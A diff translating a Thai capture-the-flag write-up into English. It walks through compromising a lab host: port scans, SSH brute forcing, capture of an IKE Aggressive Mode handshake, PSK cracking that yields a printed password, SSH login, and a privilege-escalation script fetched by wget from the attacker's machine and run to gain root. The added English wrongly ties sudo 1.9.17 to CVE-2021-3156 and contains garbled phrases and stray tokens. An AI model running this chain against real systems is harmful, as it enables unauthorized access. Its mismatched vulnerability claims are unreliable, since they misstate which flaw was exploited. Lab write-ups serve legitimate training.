@@ -1,7 +1,5 @@
 
-สวัสดีครับ!
-
-เริ่มที่สแกน `Nmap` ก่อนเลย พบว่ามีแค่ Service `ssh` Port `22` ที่เปิดอยู่
+I began by performing a full `TCP` port scan using `Nmap` to identify open services on the target and found only a single open port `22/tcp`.
 
 ```
 $ IP=10.10.11.87
@@ -20,7 +18,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 1.88 seconds
 ```
 
-ต่อไปสแกน Nmap โดยใช้ `--script ssh-auth-methods` เพื่อตรวจสอบว่าสามารถเข้าสู่ระบบได้ด้วยวิธีอะไรได้บ้าง จะเห็นว่าสามารถใช้ `publickey` หรือ `password` ได้
+I used Nmap’s `ssh-auth-methods` script to identify potential attack vectors. The SSH service supported both `publickey` and `password` authentication.
 
 ```
 $ sudo nmap --script ssh-auth-methods -p 22 10.10.11.87 
@@ -38,14 +36,16 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 3.39 seconds
 ```
 
-Ok ลองเช็ก Version ดู เผื่อมีช่องโหว่ หรือ CVE แต่เหมือนจะไม่มี
+I searched for known vulnerabilities in `OpenSSH 10.0p2` using `searchsploit`. However, no public exploits were found, suggesting the SSH version was not immediately vulnerable to known attacks.
+
 ```
 $ searchsploit OpenSSH 10.0p2 Debian 8
 Exploits: No Results
 Shellcodes: No Results
 ```
 
-ลอง Brute force `--script ssh-brute` ดูเลยละกัน .. สรุปไม่เจอ
+Given the support for password authentication, I attempted a brute force attack using Nmap’s `ssh-brute` script. After 124 attempts, no valid credentials were found.
+
 ```
 $ sudo nmap --script ssh-brute -p 22 10.10.11.87
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 07:46 +07
@@ -64,7 +64,8 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 617.04 seconds
 ```
 
-สแกน `Nmap` เฉพาะ `TCP` ไปแล้ว ลองสแกน `UDP` ดูบ้าง พบว่ามีที่เปิดอยู่แน่ ๆ คือ Service `isakmp` ที่ Port `500`
+To explore additional services, I conducted a `UDP` port scan and found an open `UDP` port `500` running `ISAKMP (IKE)`, typically associated with VPN services.
+
 ```
 $ sudo nmap -sU 10.10.11.87
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 08:01 +07
@@ -79,10 +80,8 @@ PORT     STATE         SERVICE
 4500/udp open|filtered nat-t-ike
 
 Nmap done: 1 IP address (1 host up) scanned in 1068.84 seconds
-```
-ลองสแกนต่อ
 
-```
+
 $ sudo nmap -sU -p 500 --script ike-version 10.10.11.87
 [...]
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 08:21 +07
@@ -99,10 +98,9 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
 ```
 
-เอาไปค้นดูคือไร เจออันนี้ <b>Ref:</b> https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp
-{img2}
+I used `ike-scan` to force an Aggressive Mode handshake and enumerate `IKE` attributes. 
 
-ใช้คำสั่ง `ike-scan -M -A 10.10.11.87` เพื่อสแกนเป้าหมายแบบ `Aggressive Mode (-A)` และแสดงรายละเอียดการ `Handshake (-M)`
+The response leaked sensitive information, including the identifier `ike@expressway.htb` and supported attributes like `XAUTH` and `Dead Peer Detection v1.0`
 
 ```
 $ ike-scan -M -A 10.10.11.87
@@ -120,6 +118,8 @@ Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/
 Ending ike-scan 1.9.6: 1 hosts scanned in 0.101 seconds (9.92 hosts/sec).  1 returned handshake; 0 returned notify
 ```
 
+I captured an IKE Aggressive Mode handshake to extract parameters for a PSK attack, the handshake was exported, providing key parameters for cracking.
+
 ```
 $ ike-scan -A --pskcrack 10.10.11.87
 Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
@@ -130,7 +130,7 @@ IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
 Ending ike-scan 1.9.6: 1 hosts scanned in 0.169 seconds (5.90 hosts/sec).  1 returned handshake; 0 returned notify
 ```
 
-Crack ค่าของ `IKE PSK` parameter ดู..พบว่าเจอค่าที่ hash ด้วย `SHA1` ที่ Match กัน
+Next, I using `psk-crack` with the `rockyou.txt` dictionary and successfully cracked the PSK. The key `freakingrockstarontheroad` matched the SHA1 hash.
 
 ```
 $ psk-crack --dictionary=/usr/share/seclists/rockyou.txt hashfile.txt
@@ -139,7 +139,9 @@ Running in dictionary cracking mode
 key "freakingrockstarontheroad" matches SHA1 hash 5fec442cb346155c9e595c3cd30fb7d761705453
 Ending psk-crack: 8045039 iterations in 4.096 seconds (1964021.11 iterations/sec)
 ```
-Ok! ได้ Credential มาแล้ว `ike` : `freakingrockstarontheroad` ทดสอบนำไปเข้าสู่ระบบ `ssh` พบว่าสำเร็จ!
+
+I tested the credentials via SSH, the login was successful, granting access to the user account `ike`.
+
 ```
 $ ssh ike@10.10.11.87                                                
 ike@10.10.11.87's password: 
@@ -155,7 +157,9 @@ permitted by applicable law.
 Last login: Mon Sep 22 19:32:34 2025 from 10.10.XX.XXX
 ike@expressway:~$
 ```
-จากนั้น `ls` ดู จะพบไฟล์ `user.txt` (user flag)  
+
+I directory enumeration revealed the `g!user.txt` flag:
+
 ```
 ike@expressway:~$ id
 uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
@@ -165,19 +169,15 @@ ike@expressway:~$ pwd
 /home/ike
 ike@expressway:~$ ls -lha
 total 32K
-drwx------ 4 ike  ike  4.0K Sep 16 10:23 .
-drwxr-xr-x 3 root root 4.0K Aug 14 22:48 ..
-lrwxrwxrwx 1 root root    9 Aug 29 14:57 .bash_history -> /dev/null
--rw-r--r-- 1 ike  ike   220 May 18 22:58 .bash_logout
--rw-r--r-- 1 ike  ike  3.5K Aug 28 12:49 .bashrc
-drwxr-xr-x 3 ike  ike  4.0K Aug 28 12:29 .local
--rw-r--r-- 1 ike  ike   807 May 18 22:58 .profile
-drwx------ 2 ike  ike  4.0K Sep 16 10:21 .ssh
+[...]
 -rw-r----- 1 root ike    33 Sep 22 19:05 user.txt
 ike@expressway:~$ cat user.txt
 5785[...]34a4
 ```
-ต่อไปหาทางยกระดับสิทธิ์ (Privilege Escalation) เป็น `root` ก็หาข้อมูล
+
+Next, to `escalate privileges`, I checked for `sudo` `permissions` and `version`. 
+
+The sudo version `1.9.17` was vulnerable to `CVE-2021-3156`, a known privilege escalation vulnerability.
 
 ```
 ike@expressway:/tmp/.r3z$ sudo -l
@@ -191,12 +191,11 @@ Sudoers file grammar version 50
 Sudoers I/O plugin version 1.9.17
 Sudoers audit plugin version 1.9.17
 ```
-Ok ก็เห็นว่ารุ่นของ `sudo` เป็น `1.9.17` ลองเอาไปค้นหาดูพบว่ามี CVE
+
+I downloaded a public exploit script for `CVE-2021-3156`:
 
 <b>URL:</b> https://www.exploit-db.com/exploits/52352
 {img3}
-
-ทดสอบโหลด Bash script มาใช้
 
 ```
 ike@expressway:/tmp/.r3z$ wget http://10.10.XX.XXX/52352.txt
@@ -221,7 +220,7 @@ ike@expressway:/tmp/.r3z$ ./52352.sh
 -bash: ./52352.sh: /bin/bash^M: bad interpreter: No such file or directory
 ```
 
-`!/bin/bash^M` ติดปัญหาเกี่ยวกับ Line endings (การขึ้นบรรทัด) นิดหน่อย แก้ด้วย
+The script initially failed due to incorrect line endings. I fixed this using `dos2unix`:
 
 ```
 $ sudo apt install dos2unix
@@ -229,7 +228,7 @@ $ dos2unix 52352.sh
 dos2unix: converting file 52352.sh to Unix format...
 ```
 
-จากนั้น `wget` `chmod` และสั่งการ Bash script อีกครั้ง
+I then executed the exploit and the exploit successfully escalated privileges to `r!root`.
 
 ```
 ike@expressway:/tmp/.r3z$ ./52352.sh 
@@ -239,25 +238,17 @@ root@expressway:/# id
 uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
 ```
 
-ตอนนี้เป็น `root` แล้ว 
+As root, I accessed the /root directory and retrieved the `g!root.txt` flag:
 
 ```
 root@expressway:/# ls -lha /root
 total 44K
-drwx------  6 root root 4.0K Sep 24 14:20 .
-drwxr-xr-x 18 root root 4.0K Sep 16 16:02 ..
-lrwxrwxrwx  1 root root    9 Aug 29 14:57 .bash_history -> /dev/null
--rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-drwx------  3 root root 4.0K Sep 16 16:02 .config
-drwx------  3 root root 4.0K Sep 16 16:02 .gnupg
--rw-------  1 root root   20 Sep 16 15:51 .lesshst
-drwxr-xr-x  3 root root 4.0K Sep 16 16:02 .local
-lrwxrwxrwx  1 root root    9 Sep 16 10:24 .mariadb_history -> /dev/null
--rw-r--r--  1 root root  132 May 12 20:25 .profile
+[...]
 -rw-r-----  1 root root   33 Sep 24 14:20 root.txt
--rw-r--r--  1 root root   66 May 23 21:49 .selected_editor
-drwx------  2 root root 4.0K Sep 16 16:02 .ssh
 root@expressway:/# cat /root/root.txt
 bdfd[...]b803
 ```
+
+By leveraging an `IKE` Aggressive Mode handshake to obtain credentials and exploiting a sudo vulnerability (`CVE-2021-3156`), I gained root access to the target system. This demonstrated critical misconfigurations in the IKE service and an unpatched sudo vulnerability, both of which could allow unauthorized access and full system compromise.
+
 {img4}
